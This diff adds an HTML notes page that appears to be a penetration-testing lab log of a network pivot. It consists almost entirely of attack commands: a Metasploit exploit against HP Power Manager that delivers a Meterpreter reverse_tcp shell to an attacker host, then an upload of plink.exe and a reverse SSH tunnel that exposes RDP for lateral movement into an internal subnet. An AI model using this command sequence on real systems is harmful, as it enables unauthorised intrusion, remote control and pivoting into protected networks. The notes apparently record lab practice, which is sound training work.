@@ -1,0 +1,23 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>notes</title>
+</head><body>Got access to IT Dept subnet by exploting public network machine 10.11.1.230 which has 10.1.1.230 on the IT Dept network.<br/>
+That machine is alos part of the 10.1.1.0/24 subnet with 10.1.1.230. <br/>
+<br/>
+<br/>
+<br/>
+use exploit/windows/http/hp_power_manager_filename<br/>
+set PAYLOAD windows/meterpreter/reverse_tcp<br/>
+setg RHOST 10.11.1.230<br/>
+setg LHOST 10.11.0.48<br/>
+exploit<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+From 10.11.1.230:<br/>
+<br/>
+upload /usr/share/windows-binaries/plink.exe C:\\Windows\\temp<br/>
+plink.exe -l root -R 3389:127.0.0.1:3389 10.11.0.48</body></html>
